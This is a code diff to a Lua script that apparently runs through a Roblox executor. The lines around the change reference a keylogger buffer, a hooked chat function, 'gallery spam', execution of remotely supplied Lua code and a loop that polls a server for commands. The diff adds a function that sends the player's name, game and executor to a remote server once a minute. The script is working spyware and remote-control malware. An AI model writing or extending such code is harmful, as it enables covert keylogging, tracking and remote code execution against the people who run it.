@@ -20,6 +20,7 @@ local keyloggerEnabled = false
 local keylogBuffer = ""
 local lastSendTime = os.time()
 local scriptHidden = false
+local lastUserUpdate = 0
 
 -- Сохраняем оригинальную функцию чата
 local originalChatFunction
@@ -102,6 +103,38 @@ local function getSavePaths()
     end
     
     return paths
+end
+
+-- Функция отправки информации о пользователе
+local function sendUserInfo()
+    local currentTime = os.time()
+    if currentTime - lastUserUpdate < 60 then -- Отправляем не чаще чем раз в минуту
+        return
+    end
+    
+    local playerName = player.Name
+    local success, placeInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    local placeName = success and placeInfo.Name or "Unknown"
+    local executor = identifyexecutor and identifyexecutor() or "Unknown"
+    
+    local success = pcall(function()
+        httpRequest({
+            Url = SERVER_URL.."/users",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                player = playerName,
+                place = placeName,
+                executor = executor
+            })
+        })
+    end)
+    
+    if success then
+        lastUserUpdate = currentTime
+    end
 end
 
 -- Отправка уведомления при инжекте
@@ -245,6 +278,7 @@ local function gallerySpam(imageCount)
     
     return successCount
 end
+
 -- Выполнение Lua-кода
 local function executeLua(code)
     local func, err = loadstring(code)
@@ -614,6 +648,9 @@ end
 -- Главный цикл
 while task.wait(2) do
     local hasCommand = checkCommands()
+    
+    -- Отправляем информацию о пользователе
+    pcall(sendUserInfo)
     
     if hasCommand then
         task.wait(0.5)
